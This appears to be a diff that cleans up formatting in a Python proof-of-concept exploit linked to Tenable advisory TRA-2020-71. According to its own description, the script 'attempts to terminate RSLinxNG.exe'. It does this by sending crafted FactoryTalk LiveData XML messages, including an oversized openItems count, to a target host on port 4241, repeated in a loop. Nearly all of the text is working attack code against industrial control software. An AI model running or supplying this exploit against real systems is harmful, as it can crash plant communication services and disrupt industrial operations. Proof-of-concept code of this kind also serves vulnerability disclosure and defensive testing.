@@ -6,8 +6,14 @@
 # Advisory: https://www.tenable.com/security/research/tra-2020-71
 ##
 
-import sys, socket, argparse, struct
-import re, random, hexdump
+import argparse
+import re
+import socket
+import struct
+import sys
+
+import hexdump
+
 
 def block(data, pad=False):
   dlen = len(data)
@@ -31,9 +37,9 @@ def dump(title, data):
 
 
 # MAIN
-# 
+#
 descr  = 'This script attempts to terminate RSLinxNG.exe.'
- 
+
 parser = argparse.ArgumentParser(description=descr)
 parser.add_argument('host', help='Target host')
 parser.add_argument('-p', '--port', type=int, default=4241, help='Target port, default: %(default)s')
@@ -47,9 +53,9 @@ hdr['command'] = 'XmlCommand'
 hdr['transid'] = 1
 hdr['session-id'] = None
 
-nspath = 'RNA://$Global/SomeApp/SomeServer';
+nspath = 'RNA://$Global/SomeApp/SomeServer'
 data  = '\r\n<OpenNamespace xmlns="http://FactoryTalk.net/schemas/LiveData/server/2" '
-data += 'namespacePath="' + nspath 
+data += 'namespacePath="' + nspath
 data += '" leaseTime="300" clientMachineInfo="localhost" securityToken="Token">'
 data += '\r\n<requestService>http://FactoryTalk.net/schemas/LiveData/server/NamespaceBrowse/1</requestService>'
 data += '\r\n<requestService>http://FactoryTalk.net/schemas/LiveData/server/Configuration/1</requestService></OpenNamespace>\x00'
@@ -66,14 +72,14 @@ for i in range(200):
     s.sendall(open_namespace)
     res = s.recv(4096)
     #dump('OpenNampespaceResponse', res)
-    m = re.match(b'rna\xF2.*session-id=(\d+).*', res, re.DOTALL)
+    m = re.match(b'rna\xF2.*session-id=(\\d+).*', res, re.DOTALL)
     if m is None:
       s.close()
-      sys.exit('Failed to get a sessiond id.') 
+      sys.exit('Failed to get a sessiond id.')
 
     sid = int(m.group(1))
-    hdr['transid'] = 2 
-    hdr['session-id'] = sid 
+    hdr['transid'] = 2
+    hdr['session-id'] = sid
     shortcut = 'SomeDeviceShortcut'
     data  = '\r\n<ConfigureItems>\r\n'
     data += '<openItems count="1073741812">\r\n'
@@ -84,6 +90,6 @@ for i in range(200):
     #dump('ConigureItems', config_items)
     s.sendall(config_items)
     s.recv(4096)
-  except: 
+  except:
     pass
   s.close()
